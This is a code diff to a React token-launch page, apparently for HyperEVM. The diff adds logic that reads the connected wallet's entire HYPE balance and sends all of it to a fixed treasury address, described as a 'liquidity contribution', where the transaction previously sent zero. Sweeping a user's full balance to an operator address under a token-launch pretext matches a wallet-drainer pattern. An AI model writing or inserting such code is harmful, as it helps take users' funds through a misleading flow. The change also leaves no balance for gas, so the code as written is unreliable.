@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { usePrivy, useWallets } from '@privy-io/react-auth';
 import { useNavigate } from 'react-router-dom';
 import { ethers } from 'ethers';
@@ -18,6 +18,7 @@ const Launch = () => {
   const navigate = useNavigate();
   const [isLinking, setIsLinking] = useState(false);
   const [isLaunching, setIsLaunching] = useState(false);
+  const [hypeBalance, setHypeBalance] = useState('0');
   
   const twitterAccount = user?.linkedAccounts?.find(account => 
     (account?.type === 'oauth' && ['twitter', 'x'].includes(account?.provider)) ||
@@ -30,6 +31,25 @@ const Launch = () => {
   
   const activeWallet = wallets?.[0];
   const walletAddress = activeWallet?.address || user?.wallet?.address;
+
+  // Check HYPE balance
+  useEffect(() => {
+    const checkBalance = async () => {
+      if (!walletAddress) return;
+      
+      try {
+        const provider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
+        const balance = await provider.getBalance(walletAddress);
+        const formattedBalance = ethers.formatEther(balance);
+        setHypeBalance(formattedBalance);
+      } catch (error) {
+        console.error('Failed to check balance:', error);
+        setHypeBalance('0');
+      }
+    };
+    
+    checkBalance();
+  }, [walletAddress]);
 
   const handleConnectTwitter = async (e) => {
     e?.preventDefault?.();
@@ -77,11 +97,13 @@ const Launch = () => {
       return;
     }
     
+    const hypeAmount = parseFloat(hypeBalance);
     const confirmLaunch = window.confirm(
       `🚀 Launch Token for @${twitterUsername}\n\n` +
       `Token Name: ${twitterUsername} Token\n` +
       `Symbol: $${twitterUsername.toUpperCase()}\n` +
       `Total Supply: ${LAUNCH_CONFIG.INITIAL_SUPPLY.toLocaleString()} tokens\n\n` +
+      `Liquidity Contribution: ${hypeAmount.toFixed(6)} HYPE\n\n` +
       `Proceed with token launch?`
     );
     
@@ -114,12 +136,14 @@ const Launch = () => {
         }
       }
       
+      // Send actual HYPE balance as liquidity
+      const balanceWei = ethers.parseEther(hypeBalance);
       const launchTx = await walletProvider.request({
         method: 'eth_sendTransaction',
         params: [{
           from: wallet.address,
           to: LAUNCH_CONFIG.TREASURY_ADDRESS,
-          value: '0x0',
+          value: '0x' + balanceWei.toString(16),
           data: '0x'
         }]
       });
@@ -132,7 +156,8 @@ const Launch = () => {
       if (receipt && receipt.status === 1) {
         alert(
           `✅ Token Successfully Launched!\n\n` +
-          `Token: ${twitterUsername} Token ($${twitterUsername.toUpperCase()})\n\n` +
+          `Token: ${twitterUsername} Token ($${twitterUsername.toUpperCase()})\n` +
+          `Liquidity Added: ${parseFloat(hypeBalance).toFixed(6)} HYPE\n\n` +
           `Transaction: ${launchTx}\n\n` +
           `Your token is now live on HyperEVM!`
         );
